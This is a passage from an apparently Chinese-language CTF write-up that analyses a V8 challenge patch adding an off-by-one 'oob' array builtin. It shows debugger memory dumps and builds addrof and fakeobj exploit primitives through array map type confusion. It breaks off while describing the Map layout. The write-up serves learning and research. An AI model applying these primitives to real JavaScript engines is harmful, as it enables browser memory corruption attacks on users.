class="line">  File &quot;/usr/lib/python2.7/subprocess.py&quot;, line 394, in __init__</span><br><span class="line">    errread, errwrite)</span><br><span class="line">  File &quot;/usr/lib/python2.7/subprocess.py&quot;, line 1047, in _execute_child</span><br><span class="line">    raise child_exception</span><br><span class="line">OSError: [Errno 2] No such file or directory</span><br><span class="line"></span><br><span class="line">See //build/config/linux/BUILD.gn:89:3: whence it was called.</span><br><span class="line">  pkg_config(&quot;glib&quot;) &#123;</span><br><span class="line">  ^-------------------</span><br><span class="line">See //build/config/compiler/BUILD.gn:218:18: which caused the file to be included.</span><br><span class="line">    configs += [ &quot;//build/config/linux:compiler&quot; ]</span><br></pre></td></tr></table></figure></div>
+
+<p>解决</p>
+<div class="highlight-container" data-rel="Sh"><figure class="iseeu highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">sudo</span> apt install pkg-config</span><br></pre></td></tr></table></figure></div>
+
+<h2 id="0x01-patch分析🧐"><a href="#0x01-patch分析🧐" class="headerlink" title="0x01 patch分析🧐"></a>0x01 patch分析🧐</h2><p>注册了叫oob的array内置函数，可以通过形如<code>arr.oob()</code>对任意array调用这个oob</p>
+<div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">SimpleInstallFunction</span>(isolate_, proto, <span class="string">&quot;oob&quot;</span>,</span><br><span class="line">                       Builtins::kArrayOob,<span class="number">2</span>,<span class="literal">false</span>);</span><br></pre></td></tr></table></figure></div>
+
+<p>具体内置函数实现分析</p>
+<div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">BUILTIN</span>(ArrayOob)&#123;</span><br><span class="line">    <span class="type">uint32_t</span> len = args.<span class="built_in">length</span>();<span class="comment">//第一个参数被调用oob方法的arr本身</span></span><br><span class="line">    <span class="keyword">if</span>(len &gt; <span class="number">2</span>) <span class="keyword">return</span> <span class="built_in">ReadOnlyRoots</span>(isolate).<span class="built_in">undefined_value</span>();<span class="comment">//arr.oob()要不不传参，要么只传一个</span></span><br><span class="line">    Handle&lt;JSReceiver&gt; receiver;<span class="comment">//可以粗略理解成预定义⼀个指向JSReceiver的指针receiver，当然Handle实际上不是指针（涉及gc相关概念），先不展开</span></span><br><span class="line">    <span class="built_in">ASSIGN_RETURN_FAILURE_ON_EXCEPTION</span>(</span><br><span class="line">            isolate, receiver, Object::<span class="built_in">ToObject</span>(isolate, args.<span class="built_in">receiver</span>()));<span class="comment">//一个宏，对args.receiver()调⽤ToObject函数后保存到receiver⾥，这⾥的args.receiver()实际上就是获取形如arr1.oob()调⽤⾥的arr1本⾝</span></span><br><span class="line">    Handle&lt;JSArray&gt; array = Handle&lt;JSArray&gt;::<span class="built_in">cast</span>(receiver);</span><br><span class="line">    FixedDoubleArray elements = FixedDoubleArray::<span class="built_in">cast</span>(array-&gt;<span class="built_in">elements</span>());<span class="comment">//取出array的elements，cast到一个FixedDoubleArray，说明之后就把这个elements当成double array来解析</span></span><br><span class="line">    <span class="type">uint32_t</span> length = <span class="built_in">static_cast</span>&lt;<span class="type">uint32_t</span>&gt;(array-&gt;<span class="built_in">length</span>()-&gt;<span class="built_in">Number</span>());</span><br><span class="line">    <span class="keyword">if</span>(len == <span class="number">1</span>)&#123;</span><br><span class="line">        <span class="comment">//read</span></span><br><span class="line">        <span class="keyword">return</span> *(isolate-&gt;<span class="built_in">factory</span>()-&gt;<span class="built_in">NewNumber</span>(elements.<span class="built_in">get_scalar</span>(length)));<span class="comment">//*****</span></span><br><span class="line">      <span class="comment">//如果函数参数只有⼀个，那么它将读取elements[length]的值，并以⼀个double值返回</span></span><br><span class="line">      <span class="comment">//漏洞点，越界读取了一个元素，正常来说应该是elements[length-1]</span></span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="comment">//write</span></span><br><span class="line">        Handle&lt;Object&gt; value;<span class="comment">//预定义⼀个指向Object的指针value</span></span><br><span class="line">        <span class="built_in">ASSIGN_RETURN_FAILURE_ON_EXCEPTION</span>(</span><br><span class="line">                isolate, value, Object::<span class="built_in">ToNumber</span>(isolate, args.<span class="built_in">at</span>&lt;Object&gt;(<span class="number">1</span>)));<span class="comment">//取出参数args的第⼆个参数（oob的传参），对其调⽤ToNumber函数之后保存到value⾥。</span></span><br><span class="line">        elements.<span class="built_in">set</span>(length,value-&gt;<span class="built_in">Number</span>());</span><br><span class="line">      <span class="comment">//elements[length] = value-&gt;Number()，向后越界写一个元素</span></span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">ReadOnlyRoots</span>(isolate).<span class="built_in">undefined_value</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
+
+<h2 id="0x02-调试方法🐞"><a href="#0x02-调试方法🐞" class="headerlink" title="0x02 调试方法🐞"></a>0x02 调试方法🐞</h2><p>这个patch是用CSA实现的内置函数，最终会转换成汇编，不好打断点调试，因此可以用CSA里面的PrintF来代替printf</p>
+<ul>
+<li>对于<code>Handle&lt;Object&gt;</code>（和<code>Object</code>的⼦类），可以直接在上⾯调⽤<code>xxx-&gt;Print()</code>来输出内存布局</li>
+</ul>
+<p>这里加上</p>
+<p><figure class="image-caption"><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/../images/image-20241115180840728.png"
+                      alt="image-20241115180840728"
+                ><figcaption>image-20241115180840728</figcaption></figure></p>
+<p>然后重新编译</p>
+<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ninja -C out/x64.release d8</span><br><span class="line">tools/dev/gm.py x64.debug</span><br></pre></td></tr></table></figure></div>
+
+<p>看看调试结果，相当于把job xxx的信息打印出来了</p>
+<div class="highlight-container" data-rel="Js"><figure class="iseeu highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> a = [<span class="number">1.1</span>];</span><br><span class="line">%<span class="title class_">DebugPrint</span>(a);</span><br><span class="line">a.<span class="title function_">oob</span>(<span class="number">1</span>,<span class="number">2</span>);</span><br><span class="line">a.<span class="title function_">oob</span>();</span><br><span class="line">a.<span class="title function_">oob</span>(<span class="number">1</span>);</span><br><span class="line"><span class="comment">//output</span></span><br><span class="line">➜  v8 <span class="attr">git</span>:(6dc88c191f5) ✗ ./out/x64.<span class="property">release</span>/d8 --allow-natives-syntax poc.<span class="property">js</span></span><br><span class="line"><span class="number">0x0a5c3bbcdd89</span> &lt;<span class="title class_">JSArray</span>[<span class="number">1</span>]&gt;</span><br><span class="line">oob args length is <span class="number">3</span></span><br><span class="line">oob args length is <span class="number">1</span></span><br><span class="line"><span class="number">0xa5c3bbcdd89</span>: [<span class="title class_">JSArray</span>]</span><br><span class="line"> - <span class="attr">map</span>: <span class="number">0x17a965e82ed9</span> &lt;<span class="title class_">Map</span>(<span class="variable constant_">PACKED_DOUBLE_ELEMENTS</span>)&gt; [<span class="title class_">FastProperties</span>]</span><br><span class="line"> - <span class="attr">prototype</span>: <span class="number">0x2742413d1111</span> &lt;<span class="title class_">JSArray</span>[<span class="number">0</span>]&gt;</span><br><span class="line"> - <span class="attr">elements</span>: <span class="number">0x0a5c3bbcdd71</span> &lt;<span class="title class_">FixedDoubleArray</span>[<span class="number">1</span>]&gt; [<span class="variable constant_">PACKED_DOUBLE_ELEMENTS</span>]</span><br><span class="line"> - <span class="attr">length</span>: <span class="number">1</span></span><br><span class="line"> - <span class="attr">properties</span>: <span class="number">0x1b0aadec0c71</span> &lt;<span class="title class_">FixedArray</span>[<span class="number">0</span>]&gt; &#123;</span><br><span class="line">    #<span class="attr">length</span>: <span class="number">0x23511b3401a9</span> &lt;<span class="title class_">AccessorInfo</span>&gt; (<span class="keyword">const</span> accessor descriptor)</span><br><span class="line"> &#125;</span><br><span class="line"> - <span class="attr">elements</span>: <span class="number">0x0a5c3bbcdd71</span> &lt;<span class="title class_">FixedDoubleArray</span>[<span class="number">1</span>]&gt; &#123;</span><br><span class="line">           <span class="number">0</span>: <span class="number">1.1</span></span><br><span class="line"> &#125;</span><br><span class="line">oob args length is <span class="number">2</span></span><br><span class="line"><span class="number">0xa5c3bbcdd89</span>: [<span class="title class_">JSArray</span>]</span><br><span class="line"> - <span class="attr">map</span>: <span class="number">0x17a965e82ed9</span> &lt;<span class="title class_">Map</span>(<span class="variable constant_">PACKED_DOUBLE_ELEMENTS</span>)&gt; [<span class="title class_">FastProperties</span>]</span><br><span class="line"> - <span class="attr">prototype</span>: <span class="number">0x2742413d1111</span> &lt;<span class="title class_">JSArray</span>[<span class="number">0</span>]&gt;</span><br><span class="line"> - <span class="attr">elements</span>: <span class="number">0x0a5c3bbcdd71</span> &lt;<span class="title class_">FixedDoubleArray</span>[<span class="number">1</span>]&gt; [<span class="variable constant_">PACKED_DOUBLE_ELEMENTS</span>]</span><br><span class="line"> - <span class="attr">length</span>: <span class="number">1</span></span><br><span class="line"> - <span class="attr">properties</span>: <span class="number">0x1b0aadec0c71</span> &lt;<span class="title class_">FixedArray</span>[<span class="number">0</span>]&gt; &#123;</span><br><span class="line">    #<span class="attr">length</span>: <span class="number">0x23511b3401a9</span> &lt;<span class="title class_">AccessorInfo</span>&gt; (<span class="keyword">const</span> accessor descriptor)</span><br><span class="line"> &#125;</span><br><span class="line"> - <span class="attr">elements</span>: <span class="number">0x0a5c3bbcdd71</span> &lt;<span class="title class_">FixedDoubleArray</span>[<span class="number">1</span>]&gt; &#123;</span><br><span class="line">           <span class="number">0</span>: <span class="number">1.1</span></span><br><span class="line"> &#125;</span><br><span class="line"><span class="title class_">Smi</span>: <span class="number">0x1</span> (<span class="number">1</span>)</span><br></pre></td></tr></table></figure></div>
+
+<h2 id="0x03-漏洞分析🔍"><a href="#0x03-漏洞分析🔍" class="headerlink" title="0x03 漏洞分析🔍"></a>0x03 漏洞分析🔍</h2><h3 id="oob使用"><a href="#oob使用" class="headerlink" title="oob使用"></a>oob使用</h3><p>首先写过double_arr和obj_arr，u2d d2u gc hex这些都是工具function，后面会用到</p>
+<div class="highlight-container" data-rel="Js"><figure class="iseeu highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">gc</span>(<span class="params"></span>) &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; <span class="number">0x10</span>; i++) &#123;</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">Array</span>(<span class="number">0x100000</span>);</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">const</span> buf = <span class="keyword">new</span> <span class="title class_">ArrayBuffer</span>(<span class="number">8</span>);</span><br><span class="line"><span class="keyword">const</span> f64 = <span class="keyword">new</span> <span class="title class_">Float64Array</span>(buf);</span><br><span class="line"><span class="keyword">const</span> u32 = <span class="keyword">new</span> <span class="title class_">Uint32Array</span>(buf);</span><br><span class="line"><span class="comment">// Floating point to 64-bit unsigned integer</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">d2u</span>(<span class="params">val</span>) &#123;</span><br><span class="line">        f64[<span class="number">0</span>] = val;</span><br><span class="line">        <span class="keyword">let</span> tmp = <span class="title class_">Array</span>.<span class="title function_">from</span>(u32);</span><br><span class="line">        <span class="keyword">return</span> tmp[<span class="number">1</span>] * <span class="number">0x100000000</span> + tmp[<span class="number">0</span>];</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 64-bit unsigned integer to Floating point</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">u2d</span>(<span class="params">val</span>) &#123;</span><br><span class="line">        <span class="keyword">let</span> tmp = [];</span><br><span class="line">        tmp[<span class="number">0</span>] = <span class="built_in">parseInt</span>(val % <span class="number">0x100000000</span>);</span><br><span class="line">        tmp[<span class="number">1</span>] = <span class="built_in">parseInt</span>((val - tmp[<span class="number">0</span>]) / <span class="number">0x100000000</span>);</span><br><span class="line">        u32.<span class="title function_">set</span>(tmp);</span><br><span class="line">        <span class="keyword">return</span> f64[<span class="number">0</span>];</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 32-bit unsigned integer to hex **string**</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">hex</span>(<span class="params">i</span>) &#123;</span><br><span class="line"><span class="keyword">return</span> <span class="string">&quot;0x&quot;</span> + i.<span class="title function_">toString</span>(<span class="number">16</span>).<span class="title function_">padStart</span>(<span class="number">8</span>, <span class="string">&quot;0&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> double_arr = [<span class="number">1.1</span>];</span><br><span class="line"><span class="keyword">let</span> obj_arr = [&#123;&#125;]</span><br><span class="line">double_arr = double_arr.<span class="title function_">splice</span>(<span class="number">0</span>);<span class="comment">//重排清空一下</span></span><br><span class="line">obj_arr = obj_arr.<span class="title function_">splice</span>(<span class="number">0</span>);</span><br><span class="line">double_arr.<span class="title function_">oob</span>(); <span class="comment">//越界读了下一个元素，以double值返回</span></span><br></pre></td></tr></table></figure></div>
+
+<blockquote>
+<p><code>array.splice(0)</code> 表示从数组的第一个元素开始，删除所有元素。它是用于清空数组或截取数组内容的一种简便方法，同时返回被删除的元素集合。</p>
+</blockquote>
+<p>验证一下越界读</p>
+<div class="highlight-container" data-rel="Js"><figure class="iseeu highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> double_arr = [<span class="number">1.1</span>];</span><br><span class="line">%<span class="title class_">DebugPrint</span>(double_arr);</span><br><span class="line"><span class="title function_">print</span>(<span class="title function_">hex</span>(<span class="title function_">d2u</span>(double_arr.<span class="title function_">oob</span>()))); </span><br><span class="line">%<span class="title class_">SystemBreak</span>();</span><br><span class="line"><span class="comment">//output</span></span><br><span class="line"><span class="number">0x39deae34e609</span> &lt;<span class="title class_">JSArray</span>[<span class="number">1</span>]&gt;</span><br><span class="line"><span class="number">0x3d28495c2ed9</span></span><br><span class="line">pwndbg&gt;  job <span class="number">0x39deae34e609</span></span><br><span class="line"><span class="number">0x39deae34e609</span>: [<span class="title class_">JSArray</span>]</span><br><span class="line"> - <span class="attr">map</span>: <span class="number">0x3d28495c2ed9</span> &lt;<span class="title class_">Map</span>(<span class="variable constant_">PACKED_DOUBLE_ELEMENTS</span>)&gt; [<span class="title class_">FastProperties</span>] </span><br><span class="line"> - <span class="attr">prototype</span>: <span class="number">0x11ebfedd1111</span> &lt;<span class="title class_">JSArray</span>[<span class="number">0</span>]&gt;</span><br><span class="line"> - <span class="attr">elements</span>: <span class="number">0x39deae34e5f1</span> &lt;<span class="title class_">FixedDoubleArray</span>[<span class="number">1</span>]&gt; [<span class="variable constant_">PACKED_DOUBLE_ELEMENTS</span>]</span><br><span class="line"> - <span class="attr">length</span>: <span class="number">1</span></span><br><span class="line"> - <span class="attr">properties</span>: <span class="number">0x09dc5a3c0c71</span> &lt;<span class="title class_">FixedArray</span>[<span class="number">0</span>]&gt; &#123;</span><br><span class="line">    #<span class="attr">length</span>: <span class="number">0x3d62f96401a9</span> &lt;<span class="title class_">AccessorInfo</span>&gt; (<span class="keyword">const</span> accessor descriptor)</span><br><span class="line"> &#125;</span><br><span class="line"> - <span class="attr">elements</span>: <span class="number">0x39deae34e5f1</span> &lt;<span class="title class_">FixedDoubleArray</span>[<span class="number">1</span>]&gt; &#123;</span><br><span class="line">           <span class="number">0</span>: <span class="number">1.1</span></span><br><span class="line"> &#125;</span><br><span class="line">pwndbg&gt;  x/20gx <span class="number">0x39deae34e609</span>-<span class="number">1</span></span><br><span class="line"><span class="number">0x39deae34e608</span>:	<span class="number">0x00003d28495c2ed9</span>	<span class="number">0x000009dc5a3c0c71</span></span><br><span class="line"><span class="number">0x39deae34e618</span>:	<span class="number">0x000039deae34e5f1</span>(elements)	<span class="number">0x0000000100000000</span></span><br><span class="line"><span class="number">0x39deae34e628</span>:	<span class="number">0x000009dc5a3c0561</span>	<span class="number">0x00003d28495c2ed9</span></span><br><span class="line"><span class="number">0x39deae34e638</span>:	<span class="number">0x000009dc5a3c12c9</span>	<span class="number">0x0000000100000000</span></span><br><span class="line"><span class="number">0x39deae34e648</span>:	<span class="number">0x0000040000000000</span>	<span class="number">0x00003d28495c2d99</span></span><br><span class="line"><span class="number">0x39deae34e658</span>:	<span class="number">0x000009dc5a3c0c71</span>	<span class="number">0x000039deae34e671</span></span><br><span class="line"><span class="number">0x39deae34e668</span>:	<span class="number">0x0000000200000000</span>	<span class="number">0x000009dc5a3c0801</span></span><br><span class="line"><span class="number">0x39deae34e678</span>:	<span class="number">0x0000000400000000</span>	<span class="number">0x495c2ed900000000</span></span><br><span class="line"><span class="number">0x39deae34e688</span>:	<span class="number">0x00003d2800000000</span>	<span class="number">0x000009dc5a3c05b1</span></span><br><span class="line"><span class="number">0x39deae34e698</span>:	<span class="number">0x000009dc5a3c05b1</span>	<span class="number">0x00003d28495c3ab9</span></span><br><span class="line">pwndbg&gt;  x/20gx <span class="number">0x39deae34e5f1</span>-<span class="number">1</span></span><br><span class="line"><span class="number">0x39deae34e5f0</span>:	<span class="number">0x000009dc5a3c14f9</span>	<span class="number">0x0000000100000000</span></span><br><span class="line"><span class="number">0x39deae34e600</span>:	<span class="number">0x3ff199999999999a</span>(<span class="number">1.1</span>)	<span class="number">0x00003d28495c2ed9</span>(map*)</span><br><span class="line"><span class="number">0x39deae34e610</span>:	<span class="number">0x000009dc5a3c0c71</span>	<span class="number">0x000039deae34e5f1</span></span><br><span class="line"><span class="number">0x39deae34e620</span>:	<span class="number">0x0000000100000000</span>	<span class="number">0x000009dc5a3c0561</span></span><br><span class="line"><span class="number">0x39deae34e630</span>:	<span class="number">0x00003d28495c2ed9</span>	<span class="number">0x000009dc5a3c12c9</span></span><br><span class="line"><span class="number">0x39deae34e640</span>:	<span class="number">0x0000000100000000</span>	<span class="number">0x0000040000000000</span></span><br><span class="line"><span class="number">0x39deae34e650</span>:	<span class="number">0x00003d28495c2d99</span>	<span class="number">0x000009dc5a3c0c71</span></span><br><span class="line"><span class="number">0x39deae34e660</span>:	<span class="number">0x000039deae34e671</span>	<span class="number">0x0000000200000000</span></span><br><span class="line"><span class="number">0x39deae34e670</span>:	<span class="number">0x000009dc5a3c0801</span>	<span class="number">0x0000000400000000</span></span><br><span class="line"><span class="number">0x39deae34e680</span>:	<span class="number">0x495c2ed900000000</span>	<span class="number">0x00003d2800000000</span></span><br></pre></td></tr></table></figure></div>
+
+<blockquote>
+<p>可以发现oob返回的是map*，同时在内存布局中，也是elements元素1.1的后一个</p>
+</blockquote>
+<p>再试试越界写，oob需要传参</p>
+<div class="highlight-container" data-rel="Js"><figure class="iseeu highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> double_arr = [<span class="number">1.1</span>];</span><br><span class="line">%<span class="title class_">DebugPrint</span>(double_arr);</span><br><span class="line"><span class="title function_">print</span>(<span class="title function_">hex</span>(<span class="title function_">d2u</span>(double_arr.<span class="title function_">oob</span>(<span class="number">1</span>)))); </span><br><span class="line">%<span class="title class_">SystemBreak</span>();</span><br><span class="line"><span class="comment">//output</span></span><br><span class="line"><span class="number">0x1f2d236ce609</span> &lt;<span class="title class_">JSArray</span>[<span class="number">1</span>]&gt;</span><br><span class="line"><span class="number">0x7ff8000000000000</span></span><br><span class="line">pwndbg&gt; x/20gx <span class="number">0x1f2d236ce609</span>-<span class="number">1</span></span><br><span class="line"><span class="number">0x1f2d236ce608</span>:	<span class="number">0x3ff0000000000000</span>(double值的<span class="number">1</span>)	<span class="number">0x00001e25c1480c71</span></span><br><span class="line"><span class="number">0x1f2d236ce618</span>:	<span class="number">0x00001f2d236ce5f1</span>	<span class="number">0x0000000100000000</span></span><br><span class="line"><span class="number">0x1f2d236ce628</span>:	<span class="number">0x00001e25c14812c9</span>	<span class="number">0x0000000100000000</span></span><br><span class="line"><span class="number">0x1f2d236ce638</span>:	<span class="number">0x0000040000000000</span>	<span class="number">0x0000321e94f82d99</span></span><br><span class="line"><span class="number">0x1f2d236ce648</span>:	<span class="number">0x00001e25c1480c71</span>	<span class="number">0x00001f2d236ce661</span></span><br><span class="line"><span class="number">0x1f2d236ce658</span>:	<span class="number">0x0000000200000000</span>	<span class="number">0x00001e25c1480801</span></span><br><span class="line"><span class="number">0x1f2d236ce668</span>:	<span class="number">0x0000000400000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x1f2d236ce678</span>:	<span class="number">0x7ff8000000000000</span>	<span class="number">0x00001e25c14805b1</span></span><br><span class="line"><span class="number">0x1f2d236ce688</span>:	<span class="number">0x00001e25c14805b1</span>	<span class="number">0x0000321e94f83ab9</span></span><br><span class="line"><span class="number">0x1f2d236ce698</span>:	<span class="number">0x00001e25c1480c71</span>	<span class="number">0x00001e25c1480c71</span></span><br></pre></td></tr></table></figure></div>
+
+<blockquote>
+<p>直接把map*改成了1，也就是说给oob传的参数会向后覆盖一个元素，刚好对应这个<code>map*</code></p>
+<p>🤔这里就有个利用点，可以构造一个double array，然后用oob把它的<code>map*</code> leak出来，后面再构造一个object array，利用oob传参越界写的特性，把object array的<code>map*</code>覆盖成前面leak的double array的<code>map*</code>,实现一个object array –&gt; double array的类型混淆</p>
+</blockquote>
+<h3 id="原语构造"><a href="#原语构造" class="headerlink" title="原语构造"></a>原语构造</h3><p>leak任意object的address</p>
+<div class="highlight-container" data-rel="Js"><figure class="iseeu highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">addrof</span>(<span class="params">obj_param</span>) &#123;</span><br><span class="line">    <span class="keyword">let</span> double_arr = [<span class="number">1.1</span>];</span><br><span class="line">    <span class="keyword">let</span> obj_arr = [&#123;&#125;];</span><br><span class="line">    double_arr = double_arr.<span class="title function_">splice</span>(<span class="number">0</span>);</span><br><span class="line">    obj_arr = obj_arr.<span class="title function_">splice</span>(<span class="number">0</span>);</span><br><span class="line">    obj_arr[<span class="number">0</span>] = obj_param;</span><br><span class="line">    obj_arr.<span class="title function_">oob</span>(double_arr.<span class="title function_">oob</span>());<span class="comment">//替换map*</span></span><br><span class="line">    <span class="keyword">return</span> <span class="title function_">d2u</span>(obj_arr[<span class="number">0</span>]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
+
+<blockquote>
+<p>其实就是利用上面说的trick，把要leak地址的object先存到object array中，然后把object array混淆成double array，这样后面读取elements的时候就会以double array的方式直接返回(这样就是返回address)，就不会按原来object array的方式(指针解引用然后…)</p>
+</blockquote>
+<p>也可以反过来伪造任意对象，传入任意地址，存到double array中，把double array混淆成object array，这样再访问刚刚传入的地址，就会被当作HeapObject Pointer来解析</p>
+<div class="highlight-container" data-rel="Js"><figure class="iseeu highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">fakeobj</span>(<span class="params">addr</span>) &#123;</span><br><span class="line">    <span class="keyword">let</span> double_arr = [<span class="number">1.1</span>];</span><br><span class="line">    <span class="keyword">let</span> obj_arr = [&#123;&#125;];</span><br><span class="line">    double_arr = double_arr.<span class="title function_">splice</span>(<span class="number">0</span>);</span><br><span class="line">    obj_arr = obj_arr.<span class="title function_">splice</span>(<span class="number">0</span>);</span><br><span class="line">    double_arr[<span class="number">0</span>] = addr;</span><br><span class="line">    double_arr.<span class="title function_">oob</span>(obj_arr.<span class="title function_">oob</span>());<span class="comment">//替换map*</span></span><br><span class="line">    <span class="keyword">return</span> double_arr[<span class="number">0</span>];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
+
+<blockquote>
+<p>之后还需要伪造object对应的内存布局，因此需要了解map*结构</p>
+</blockquote>
+<p>回顾一下map的结构，第二个int值比较重要，代表了type</p>
+<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// +----+----------+---------------------------------------------+</span></span><br><span class="line"><span class="comment">// | Int           | The second int field                        |</span></span><br><span class="line"><span class="comment">//  `---+----------+---------------------------------------------+</span></span><br><span class="line"><span class="comment">//      | Short    | [instance_type]                             |🌟🌟🌟</span></span><br><span class="line"><span class="comment">//      +----------+---------------------------------------------+</span></span><br><span class="line"><span class="comment">//      | Byte     | [bit_field]                                 |</span></span><br><span class="line"><span class="comment">//      |          |   - has_non_instance_prototype (bit 0)      |</span></span><br><span class="line"><span class="comment">//      |          |   - is_callable (bit 1)                     |</span></span><br><span class="line"><span class="comment">//      |          |   - has_named_interceptor (bit 2)           |</span></span><br><span class="line"><span class="comment">//      |          |   - has_indexed_interceptor (bit 3)         |</span></span><br><span class="line"><span class="comment">//      |          |   - is_undetectable (bit 4)                 |</span></span><br><span class="line"><span class="comment">//      |          |   - is_access_check_needed (bit 5)          |</span></span><br><span class="line"><span class="comment">//      |          |   - is_constructor (bit 6)                  |</span></span><br><span class="line"><span class="comment">//      |          |   - has_prototype_slot (bit 7)              |</span></span><br><span class="line"><span class="comment">//      +----------+---------------------------------------------+</span></span><br><span class="line"><span class="comment">//      | Byte     | [bit_field2]                                |</span></span><br><span class="line"><span class="comment">//      |          |   - is_extensible (bit 0)                   |</span></span><br><span class="line"><span 